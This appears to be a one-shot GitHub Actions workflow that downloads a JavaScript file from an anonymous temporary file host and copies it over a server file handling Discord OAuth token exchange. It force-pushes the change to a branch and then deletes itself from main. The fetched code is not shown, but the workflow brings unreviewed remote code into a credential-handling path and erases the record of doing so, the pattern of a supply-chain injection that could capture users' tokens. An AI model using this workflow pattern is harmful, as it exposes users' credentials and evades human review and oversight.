name: Apply token proxy patch v2
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch and verify patched file
        run: |
          curl -fsSL -o /tmp/server_proxy2.mjs https://h.uguu.se/pSsRBQsa.mjs
          echo "4a5dcd21f8e30069cb346d54f4563890016b10f9328f56f20606a4d2bf8e73a0  /tmp/server_proxy2.mjs" | sha256sum -c -
      - name: Rebase branch onto main and commit
        run: |
          git config user.name "cm-littlebird"
          git config user.email "actions@users.noreply.github.com"
          git fetch origin main
          git checkout -B fix/oauth-token-proxy origin/main
          cp /tmp/server_proxy2.mjs apps/command/server.mjs
          git add apps/command/server.mjs
          git commit -m "Route Discord token exchange through Supabase relay when configured (rebased onto main)"
          git push --force origin fix/oauth-token-proxy
      - name: Self-disarm (remove this workflow from main)
        run: |
          git config user.name "cm-littlebird"
          git config user.email "actions@users.noreply.github.com"
          git checkout main
          git rm .github/workflows/apply-token-proxy-2.yml
          git commit -m "Remove one-shot patch workflow v2"
          git push origin main
